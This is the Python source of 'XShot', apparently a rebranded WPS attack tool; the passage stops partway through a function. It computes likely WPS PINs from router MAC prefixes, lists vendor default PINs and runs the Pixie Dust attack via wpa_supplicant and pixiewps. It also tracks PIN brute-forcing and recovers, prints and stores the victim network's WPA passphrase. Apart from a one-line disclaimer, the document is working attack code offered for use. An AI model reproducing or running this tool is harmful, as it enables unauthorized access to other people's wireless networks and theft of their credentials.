#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
XShot - Advanced WPS Attack Tool (Pixie Dust + Bruteforce)
Powered by Team AX 🚀
Website: https://team-ax.top/
"""

import sys
import subprocess
import os
import tempfile
import shutil
import re
import codecs
import socket
import pathlib
import time
from datetime import datetime
import collections
import statistics
import csv
from pathlib import Path
from typing import Dict, List, Optional

# Colors
RED = '\033[1;31m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
PURPLE = '\033[1;35m'
CYAN = '\033[1;36m'
NC = '\033[0m'
BOLD = '\033[1m'     # Bold

os.system("clear")
def print_banner():
    banner = f"""
{PURPLE}██╗  ██╗███████╗██╗  ██╗ ██████╗ ████████╗
╚██╗██╔╝██╔════╝██║  ██║██╔═══██╗╚══██╔══╝
 ╚███╔╝ ███████╗███████║██║   ██║   ██║   
 ██╔██╗ ╚════██║██╔══██║██║   ██║   ██║   
██╔╝ ██╗███████║██║  ██║╚██████╔╝   ██║   
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   {NC}
{CYAN}          Advanced WPS Attack Tool v1.0{NC}
{BLUE}       Powered by Team AX{NC}
{YELLOW}       https://team-ax.top/{NC}
    """
    print(banner)
    print(f"{RED}⚠️  DISCLAIMER: For educational and authorized testing only. Team AX is not responsible for misuse.{NC}\n")

class NetworkAddress:
    def __init__(self, mac: str | int):
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(self._str_repr)
        else:
            raise ValueError('MAC address must be string or integer')

    @property
    def string(self) -> str:
        return self._str_repr

    @string.setter
    def string(self, value: str):
        self._str_repr = value
        self._int_repr = self._mac2int(value)

    @property
    def integer(self) -> int:
        return self._int_repr

    @integer.setter
    def integer(self, value: int):
        self._int_repr = value
        self._str_repr = self._int2mac(value)

    def __int__(self) -> int:
        return self.integer

    def __str__(self) -> str:
        return self.string

    def __iadd__(self, other: int):
        self.integer += other
        return self

    def __isub__(self, other: int):
        self.integer -= other
        return self

    def __eq__(self, other: 'NetworkAddress') -> bool:
        return self.integer == other.integer

    def __ne__(self, other: 'NetworkAddress') -> bool:
        return self.integer != other.integer

    def __lt__(self, other: 'NetworkAddress') -> bool:
        return self.integer < other.integer

    def __gt__(self, other: 'NetworkAddress') -> bool:
        return self.integer > other.integer

    @staticmethod
    def _mac2int(mac: str) -> int:
        return int(mac.replace(':', ''), 16)

    @staticmethod
    def _int2mac(mac_int: int) -> str:
        mac = hex(mac_int)[2:].upper().zfill(12)
        return ':'.join(mac[i:i+2] for i in range(0, 12, 2))

    def __repr__(self) -> str:
        return f'NetworkAddress(string={self._str_repr}, integer={self._int_repr})'

class XShotPIN:
    """XShot WPS PIN Generator - Powered by Team AX"""
    def __init__(self):
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC = 2

        self.algos: Dict[str, Dict] = {
            'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
            'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
            'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32},
            'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
            'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
            'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
            'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
            # Static pins
            'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
            'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
            'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
            'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
            'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
            'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
            'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
            'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
            'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
            'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
            'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
            'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
            'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
            'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
            'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
            'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
            'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
            'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
            'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
            'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
            'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
            'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
            'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521},
        }

    @staticmethod
    def checksum(pin: int) -> int:
        accum = 0
        t = pin
        while t:
            accum += 3 * (t % 10)
            t //= 10
            accum += t % 10
            t //= 10
        return (10 - accum % 10) % 10

    def generate(self, algo: str, mac: str) -> str:
        mac = NetworkAddress(mac)
        if algo not in self.algos:
            raise ValueError('Invalid WPS pin algorithm')
        pin = self.algos[algo]['gen'](mac)
        if self.algos[algo]['mode'] == self.ALGO_EMPTY:
            return pin
        pin = int(pin) % 10000000
        return f"{pin}{self.checksum(pin)}".zfill(8)

    def get_all(self, mac: str, get_static: bool = True) -> List[Dict]:
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def get_list(self, mac: str, get_static: bool = True) -> List[str]:
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            res.append(self.generate(ID, mac))
        return res

    def get_suggested(self, mac: str) -> List[Dict]:
        algos = self._suggest(mac)
        res = []
        for ID in algos:
            algo = self.algos[ID]
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def get_suggested_list(self, mac: str) -> List[str]:
        algos = self._suggest(mac)
        res = []
        for algo in algos:
            res.append(self.generate(algo, mac))
        return res

    def get_likely(self, mac: str) -> Optional[str]:
        res = self.get_suggested_list(mac)
        if res:
            return res[0]
        return None

    def _suggest(self, mac: str) -> List[str]:
        mac = mac.replace(':', '').upper()
        algorithms = {
            # (same as original - no change)
            'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', '381766', '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E', 'AA285D', 'B0B2DC', 'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D', 'E243F6', 'EC43F6', 'EE43F6', 'F2B2DC', 'FCF528', 'FEF528', '4C9EFF', '0014D1', 'D8EB97', '1C7EE5', '84C9B2', 'FC7516', '14D64D', '9094E4', 'BCF685', 'C4A81D', '00664B', '087A4C', '14B968', '2008ED', '346BD3', '4CEDDE', '786A89', '88E3AB', 'D46E5C', 'E8CD2D', 'EC233D', 'ECCB30', 'F49FF3', '20CF30', '90E6BA', 'E0CB4E', 'D4BF7F4', 'F8C091', '001CDF', '002275', '08863B', '00B00C', '081075', 'C83A35', '0022F7', '001F1F', '00265B', '68B6CF', '788DF7', 'BC1401', '202BC1', '308730', '5C4CA9', '62233D', '623CE4', '623DFF', '6253D4', '62559C', '626BD3', '627D5E', '6296BF', '62A8E4', '62B686', '62C06F', '62C61F', '62C714', '62CBA8', '62CDBE', '62E87B', '6416F0', '6A1D67', '6A233D', '6A3DFF', '6A53D4', '6A559C', '6A6BD3', '6A96BF', '6A7D5E', '6AA8E4', '6AC06F', '6AC61F', '6AC714', '6ACBA8', '6ACDBE', '6AD15E', '6AD167', '721D67', '72233D', '723CE4', '723DFF', '7253D4', '72559C', '726BD3', '727D5E', '7296BF', '72A8E4', '72C06F', '72C61F', '72C714', '72CBA8', '72CDBE', '72D15E', '72E87B', '0026CE', '9897D1', 'E04136', 'B246FC', 'E24136', '00E020', '5CA39D', 'D86CE9', 'DC7144', '801F02', 'E47CF9', '000CF6', '00A026', 'A0F3C1', '647002', 'B0487A', 'F81A67', 'F8D111', '34BA9A', 'B4944E'),
            'pin28': ('200BC7', '4846FB', 'D46AA8', 'F84ABF'),
            'pin32': ('000726', 'D8FEE3', 'FC8B97', '1062EB', '1C5F2B', '48EE0C', '802689', '908D78', 'E8CC18', '2CAB25', '10BF48', '14DAE9', '3085A9', '50465D', '5404A6', 'C86000', 'F46D04', '3085A9', '801F02'),
            'pinDLink': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'A0AB1B', 'B8A386', 'C0A0BB', 'CCB255', 'FC7516', '0014D1', 'D8EB97'),
            'pinDLink1': ('0018E7', '00195B', '001CF0', '001E58', '002191', '0022B0', '002401', '00265A', '14D64D', '1C7EE5', '340804', '5CD998', '84C9B2', 'B8A386', 'C8BE19', 'C8D3A3', 'CCB255', '0014D1'),
            'pinASUS': ('049226', '04D9F5', '08606E', '0862669', '107B44', '10BF48', '10C37B', '14DDA9', '1C872C', '1CB72C', '2C56DC', '2CFDA1', '305A3A', '382C4A', '38D547', '40167E', '50465D', '54A050', '6045CB', '60A44C', '704D7B', '74D02B', '7824AF', '88D7F6', '9C5C8E', 'AC220B', 'AC9E17', 'B06EBF', 'BCEE7B', 'C860007', 'D017C2', 'D850E6', 'E03F49', 'F0795978', 'F832E4', '00072624', '0008A1D3', '00177C', '001EA6', '00304FB', '00E04C0', '048D38', '081077', '081078', '081079', '083E5D', '10FEED3C', '181E78', '1C4419', '2420C7', '247F20', '2CAB25', '3085A98C', '3C1E04', '40F201', '44E9DD', '48EE0C', '5464D9', '54B80A', '587BE906', '60D1AA21', '64517E', '64D954', '6C198F', '6C7220', '6CFDB9', '78D99FD', '7C2664', '803F5DF6', '84A423', '88A6C6', '8C10D4', '8C882B00', '904D4A', '907282', '90F65290', '94FBB2', 'A01B29', 'A0F3C1E', 'A8F7E00', 'ACA213', 'B85510', 'B8EE0E', 'BC3400', 'BC9680', 'C891F9', 'D00ED90', 'D084B0', 'D8FEE3', 'E4BEED', 'E894F6F6', 'EC1A5971', 'EC4C4D', 'F42853', 'F43E61', 'F46BEF', 'F8AB05', 'FC8B97', '7062B8', '78542E', 'C0A0BB8C', 'C412F5', 'C4A81D', 'E8CC18', 'EC2280', 'F8E903F4'),
            'pinAirocon': ('0007262F', '000B2B4A', '000EF4E7', '001333B', '00177C', '001AEF', '00E04BB3', '02101801', '0810734', '08107710', '1013EE0', '2CAB25C7', '788C54', '803F5DF6', '94FBB2', 'BC9680', 'F43E61', 'FC8B97'),
            'pinEmpty': ('E46F13', 'EC2280', '58D56E', '1062EB', '10BEF5', '1C5F2B', '802689', 'A0AB1B', '74DADA', '9CD643', '68A0F6', '0C96BF', '20F3A3', 'ACE215', 'C8D15E', '000E8F', 'D42122', '3C9872', '788102', '7894B4', 'D460E3', 'E06066', '004A77', '2C957F', '64136C', '74A78E', '88D274', '702E22', '74B57E', '789682', '7C3953', '8C68C8', 'D476EA', '344DEA', '38D82F', '54BE53', '709F2D', '94A7B7', '981333', 'CAA366', 'D0608C'),
            'pinCisco': ('001A2B', '00248C', '002618', '344DEB', '7071BC', 'E06995', 'E0CB4E', '7054F5'),
            'pinBrcm1': ('ACF1DF', 'BCF685', 'C8D3A3', '988B5D', '001AA9', '14144B', 'EC6264'),
            'pinBrcm2': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19'),
            'pinBrcm3': ('14D64D', '1C7EE5', '28107B', 'B8A386', 'BCF685', 'C8BE19', '7C034C'),
            'pinBrcm4': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm5': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm6': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinAirc1': ('181E78', '40F201', '44E9DD', 'D084B0'),
            'pinAirc2': ('84A423', '8C10D4', '88A6C6'),
            'pinDSL2740R': ('00265A', '1CBDB9', '340804', '5CD998', '84C9B2', 'FC7516'),
            'pinRealtek1': ('0014D1', '000C42', '000EE8'),
            'pinRealtek2': ('007263', 'E4BEED'),
            'pinRealtek3': ('08C6B3',),
            'pinUpvel': ('784476', 'D4BF7F0', 'F8C091'),
            'pinUR814AC': ('D4BF7F60',),
            'pinUR825AC': ('D4BF7F5',),
            'pinOnlime': ('D4BF7F', 'F8C091', '144D67', '784476', '0014D1'),
            'pinEdimax': ('801F02', '00E04C'),
            'pinThomson': ('002624', '4432C8', '88F7C7', 'CC03FA'),
            'pinHG532x': ('00664B', '086361', '087A4C', '0C96BF', '14B968', '2008ED', '2469A5', '346BD3', '786A89', '88E3AB', '9CC172', 'ACE215', 'D07AB5', 'CCA223', 'E8CD2D', 'F80113', 'F83DFF'),
            'pinH108L': ('4C09B4', '4CAC0A', '84742A4', '9CD24B', 'B075D5', 'C864C7', 'DC028E', 'FCC897'),
            'pinONO': ('5C353B', 'DC537C')
        }
        res = []
        for algo_id, masks in algorithms.items():
            if any(mac.startswith(mask) for mask in masks):
                res.append(algo_id)
        return res

    def pin24(self, mac: NetworkAddress) -> int:
        return mac.integer & 0xFFFFFF

    def pin28(self, mac: NetworkAddress) -> int:
        return mac.integer & 0xFFFFFFF

    def pin32(self, mac: NetworkAddress) -> int:
        return mac.integer % 0x100000000

    def pinDLink(self, mac: NetworkAddress) -> int:
        nic = mac.integer & 0xFFFFFF
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) +
                ((pin & 0xF) << 8) +
                ((pin & 0xF) << 12) +
                ((pin & 0xF) << 16) +
                ((pin & 0xF) << 20))
        pin %= 1000000
        if pin < 100000:
            pin += ((pin % 9) * 100000) + 100000
        return pin

    def pinDLink1(self, mac: NetworkAddress) -> int:
        mac.integer += 1
        return self.pinDLink(mac)

    def pinASUS(self, mac: NetworkAddress) -> int:
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ''
        for i in range(7):
            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
        return int(pin)

    def pinAirocon(self, mac: NetworkAddress) -> int:
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ((b[0] + b[1]) % 10) + (((b[5] + b[0]) % 10) * 10) + (((b[4] + b[5]) % 10) * 100) + (((b[3] + b[4]) % 10) * 1000) + (((b[2] + b[3]) % 10) * 10000) + (((b[1] + b[2]) % 10) * 100000) + (((b[0] + b[1]) % 10) * 1000000)
        return pin

def recvuntil(pipe: subprocess.Popen, what: str) -> str:
    s = ''
    while True:
        inp = pipe.stdout.read(1)
        if inp == '':
            return s
        s += inp
        if what in s:
            return s

def get_hex(line: str) -> str:
    a = line.split(':', 2)
    return a[2].replace(' ', '').upper()

class PixiewpsData:
    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''

    def clear(self):
        self.__init__()

    def got_all(self) -> bool:
        return bool(self.pke and self.pkr and self.e_nonce and self.authkey and self.e_hash1 and self.e_hash2)

    def get_pixie_cmd(self, full_range: bool = False) -> str:
        pixiecmd = f"pixiewps --pke {self.pke} --pkr {self.pkr} --e-hash1 {self.e_hash1} --e-hash2 {self.e_hash2} --authkey {self.authkey} --e-nonce {self.e_nonce}"
        if full_range:
            pixiecmd += ' --force'
        return pixiecmd

class ConnectionStatus:
    def __init__(self):
        self.status = ''  # WSC_NACK, WPS_FAIL or GOT_PSK
        self.last_m_message = 0
        self.essid = ''
        self.bssid = ''
        self.wpa_psk = ''

    def isFirstHalfValid(self) -> bool:
        return self.last_m_message > 5

    def clear(self):
        self.__init__()

class BruteforceStatus:
    def __init__(self):
        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.mask = ''
        self.last_attempt_time = time.time()
        self.attempts_times = collections.deque(maxlen=15)
        self.counter = 0
        self.statistics_period = 5

    def display_status(self):
        average_pin_time = statistics.mean(self.attempts_times)
        if len(self.mask) == 4:
            percentage = int(self.mask) / 11000 * 100
        else:
            percentage = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
        print(f"{YELLOW}[*] {percentage:.2f}% complete @ {self.start_time} ({average_pin_time:.2f} seconds/pin){NC}")

    def registerAttempt(self, mask: str):
        self.mask = mask
        self.counter += 1
        current_time = time.time()
        self.attempts_times.append(current_time - self.last_attempt_time)
        self.last_attempt_time = current_time
        if self.counter == self.statistics_period:
            self.counter = 0
            self.display_status()

    def clear(self):
        self.__init__()

class Companion:
    def __init__(self, interface: str, save_result: bool = False, print_debug: bool = False):
        self.interface = interface
        self.save_result = save_result
        self.print_debug = print_debug

        self.tempdir = tempfile.mkdtemp()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
            temp.write(f'ctrl_interface={self.tempdir}\nctrl_interface_group=root\nupdate_config=1\n')
            self.tempconf = temp.name
        self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
        self.__init_wpa_supplicant()

        self.res_socket_file = f"{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}"
        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.retsock.bind(self.res_socket_file)

        self.pixie_creds = PixiewpsData()
        self.connection_status = ConnectionStatus()

        user_home = str(Path.home())
        self.sessions_dir = f'{user_home}/.XShot/sessions/'
        self.pixiewps_dir = f'{user_home}/.XShot/pixiewps/'
        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
        os.makedirs(self.sessions_dir, exist_ok=True)
        os.makedirs(self.pixiewps_dir, exist_ok=True)
        os.makedirs(self.reports_dir, exist_ok=True)

        self.generator = XShotPIN()

    def __init_wpa_supplicant(self):
        print(f"{BLUE}[*] Running wpa_supplicant…{NC}")
        cmd = f'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{self.interface} -c{self.tempconf}'
        self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        while True:
            ret = self.wpas.poll()
            if ret is not None and ret != 0:
                raise ValueError(f'{RED}wpa_supplicant returned an error: {self.wpas.communicate()[0]}{NC}')
            if os.path.exists(self.wpas_ctrl_path):
                break
            time.sleep(0.1)

    def sendOnly(self, command: str):
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)

    def sendAndReceive(self, command: str) -> str:
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        b, address = self.retsock.recvfrom(4096)
        return b.decode('utf-8', errors='replace')

    @staticmethod
    def _explain_wpas_not_ok_status(command: str, respond: str) -> str:
        if command.startswith(('WPS_REG', 'WPS_PBC')):
            if respond == 'UNKNOWN COMMAND':
                return f'{RED}[!] wpa_supplicant lacks WPS support ("CONFIG_WPS=y"){NC}'
        return f'{RED}[!] Something went wrong — check debug log{NC}'

    def __handle_wpas(self, pixiemode: bool = False, pbc_mode: bool = False, verbose: Optional[bool] = None) -> bool:
        if verbose is None:
            verbose = self.print_debug
        line = self.wpas.stdout.readline()
        if not line:
            self.wpas.wait()
            return False
        line = line.rstrip('\n')
        if verbose:
            sys.stderr.write(line + '\n')

        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                n = int(line.split('Building Message M')[1].replace('D', ''))
                self.connection_status.last_m_message = n
                print(f"{BLUE}[*] Sending WPS Message M{n}…{NC}")
            elif 'Received M' in line:
                n = int(line.split('Received M')[1])
                self.connection_status.last_m_message = n
                print(f"{GREEN}[*] Received WPS Message M{n}{NC}")
                if n == 5:
                    print(f"{GREEN}[+] The first half of the PIN is valid{NC}")
            elif 'Received WSC_NACK' in line:
                self.connection_status.status = 'WSC_NACK'
                print(f"{YELLOW}[*] Received WSC NACK{NC}")
                print(f"{RED}[-] Error: wrong PIN code{NC}")
            elif 'Enrollee Nonce' in line and 'hexdump' in line:
                self.pixie_creds.e_nonce = get_hex(line)
                if pixiemode:
                    print(f"{YELLOW}[P] E-Nonce: {self.pixie_creds.e_nonce}{NC}")
            elif 'DH own Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pkr = get_hex(line)
                if pixiemode:
                    print(f"{YELLOW}[P] PKR: {self.pixie_creds.pkr}{NC}")
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pke = get_hex(line)
                if pixiemode:
                    print(f"{YELLOW}[P] PKE: {self.pixie_creds.pke}{NC}")
            elif 'AuthKey' in line and 'hexdump' in line:
                self.pixie_creds.authkey = get_hex(line)
                if pixiemode:
                    print(f"{YELLOW}[P] AuthKey: {self.pixie_creds.authkey}{NC}")
            elif 'E-Hash1' in line and 'hexdump' in line:
                self.pixie_creds.e_hash1 = get_hex(line)
                if pixiemode:
                    print(f"{YELLOW}[P] E-Hash1: {self.pixie_creds.e_hash1}{NC}")
            elif 'E-Hash2' in line and 'hexdump' in line:
                self.pixie_creds.e_hash2 = get_hex(line)
                if pixiemode:
                    print(f"{YELLOW}[P] E-Hash2: {self.pixie_creds.e_hash2}{NC}")
            elif 'Network Key' in line and 'hexdump' in line:
                self.connection_status.status = 'GOT_PSK'
                self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace')
        elif ': State: ' in line:
            if '-> SCANNING' in line:
                self.connection_status.status = 'scanning'
                print(f"{BLUE}[*] Scanning…{NC}")
        elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
            self.connection_status.status = 'WPS_FAIL'
            print(f"{RED}[-] wpa_supplicant returned WPS-FAIL{NC}")
        elif 'Trying to authenticate with' in line:
            self.connection_status.status = 'authenticating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            print(f"{BLUE}[*] Authenticating…{NC}")
        elif 'Authentication response' in line:
            print(f"{GREEN}[+] Authenticated{NC}")
        elif 'Trying to associate with' in line:
            self.connection_status.status = 'associating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            print(f"{BLUE}[*] Associating with AP…{NC}")
        elif ('Associated with' in line) and (self.interface in line):
            bssid = line.split()[-1].upper()
            if self.connection_status.essid:
                print(f"{GREEN}[+] Associated with {bssid} (ESSID: {self.connection_status.essid}){NC}")
            else:
                print(f"{GREEN}[+] Associated with {bssid}{NC}")
        elif 'EAPOL: txStart' in line:
            self.connection_status.status = 'eapol_start'
            print(f"{BLUE}[*] Sending EAPOL Start…{NC}")
        elif 'EAP entering state IDENTITY' in line:
            print(f"{YELLOW}[*] Received Identity Request{NC}")
        elif 'using real identity' in line:
            print(f"{BLUE}[*] Sending Identity Response…{NC}")
        elif pbc_mode and ('selected BSS ' in line):
            bssid = line.split('selected BSS ')[-1].split()[0].upper()
            self.connection_status.bssid = bssid
            print(f"{BLUE}[*] Selected AP: {bssid}{NC}")

        return True

    def __runPixiewps(self, showcmd: bool = False, full_range: bool = False) -> Optional[str]:
        print(f"{BLUE}[*] Running Pixiewps…{NC}")
        cmd = self.pixie_creds.get_pixie_cmd(full_range)
        if showcmd:
            print(cmd)
        r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=sys.stdout, encoding='utf-8', errors='replace')
        print(r.stdout)
        if r.returncode == 0:
            lines = r.stdout.splitlines()
            for line in lines:
                if ('[+]' in line) and ('WPS pin' in line):
                    pin = line.split(':')[-1].strip()
                    if pin == '<empty>':
                        pin = "''"
                    return pin
        return None

    def __credentialPrint(self, wps_pin: Optional[str], wpa_psk: str, essid: str):
        print(f"{NC}[+] WPS PIN: '{wps_pin}'{NC}")
        print(f"{GREEN}[+] WPA PSK: '{BOLD}{wpa_psk}{NC}'{NC}")
        print(f"{GREEN}[+] AP SSID: '{BOLD}{essid}{NC}'{NC}")

    def __saveResult(self, bssid: str, essid: str, wps_pin: Optional[str], wpa_psk: str):
        filename = self.reports_dir + 'xshot_stored'
        dateStr = datetime.now().strftime("%d.%m.%Y %H:%M")
        with open(filename + '.txt', 'a', encoding='utf-8') as file:
            file.write(f'{dateStr}\nBSSID: {bssid}\nESSID: {essid}\nWPS PIN: {wps_pin}\nWPA PSK: {wpa_psk}\n\n')
        writeTableHeader = not os.path.isfile(filename + '.csv')
        with open(filename + '.csv', 'a', newline='', encoding='utf-8') as file:
            csvWriter = csv.writer(file, delimiter=';', quoting=csv.QUOTE_ALL)
            if writeTableHeader:
                csvWriter.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
            csvWriter.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
        print(f"{CYAN}[i] Credentials saved to {filename}.txt, {filename}.csv{NC}")

    def __savePin(self, bssid: str, pin: str):
        filename = self.pixiewps_dir + f'{bssid.replace(":", "").upper()}.run'
        with open(filename, 'w') as file:
            file.write(pin)
        print(f"{CYAN}[i] PIN saved in {filename}{NC}")

    def __prompt_wpspin(self, bssid: str) -> Optional[str]:
        pins = self.generator.get_suggested(bssid)
        if len(pins) > 1:
            print(f"{YELLOW}PINs generated for {bssid}:{NC}")
            print('{:<3} {:<10} {:<}'.format('#', 'PIN', 'Name'))
            for i, pin in enumerate(pins):
                number = f'{i + 1})'
                line = '{:<3} {:<10} {:<}'.format(number, pin['pin'], pin['name'])
                print(line)
            while True:
                pinNo = input(f'{BLUE}Select the PIN: {NC}')
                try:
                    pin_idx = int(pinNo) - 1
                    if 0 <= pin_idx < len(pins):
                        return pins[pin_idx]['pin']
                except ValueError:
                    print(f"{RED}Invalid number{NC}")
        elif len(pins) == 1:
            pin = pins[0]['pin']
            print(f"{CYAN}[i] The only probable PIN is selected: {pins[0]['name']}{NC}")
            return pin
        return None

    def __wps_connection(self, bssid: Optional[str] = None, pin: Optional[str] = None, pixiemode: bool = False, pbc_mode: bool = False, verbose: Optional[bool] = None) -> bool:
        if verbose is None:
            verbose = self.print_debug
        self.pixie_creds.clear()
        self.connection_status.clear()
        self.wpas.stdout.read(300)  # Clean pipe
        if pbc_mode:
            if bssid:
                print(f"{BLUE}[*] Starting WPS push button connection to {bssid}…{NC}")
                cmd = f'WPS_PBC {bssid}'
            else:
                print(f"{BLUE}[*] Starting WPS push button connection…{NC}")
                cmd = 'WPS_PBC'
        else:
            print(f"{BLUE}[*] Trying PIN '{pin}'…{NC}")
            cmd = f'WPS_REG {bssid} {pin}'
        r = self.sendAndReceive(cmd)
        if 'OK' not in r:
            self.connection_status.status = 'WPS_FAIL'
            print(self._explain_wpas_not_ok_status(cmd, r))
            return False

        while True:
            res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose)
            if not res:
                break
            if self.connection_status.status in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
                break

        self.sendOnly('WPS_CANCEL')
        return False

    def single_connection(self, bssid: Optional[str] = None, pin: Optional[str] = None, pixiemode: bool = False, pbc_mode: bool = False, showpixiecmd: bool = False, pixieforce: bool = False, store_pin_on_fail: bool = False) -> bool:
        if not pin:
            if pixiemode:
                try:
                    filename = self.pixiewps_dir + f'{bssid.replace(":", "").upper()}.run'
                    with open(filename, 'r') as file:
                        t_pin = file.readline().strip()
                    if input(f'{BLUE}[?] Use previously calculated PIN {t_pin}? [n/Y] {NC}').lower() != 'n':
                        pin = t_pin
                    else:
                        raise FileNotFoundError
                except FileNotFoundError:
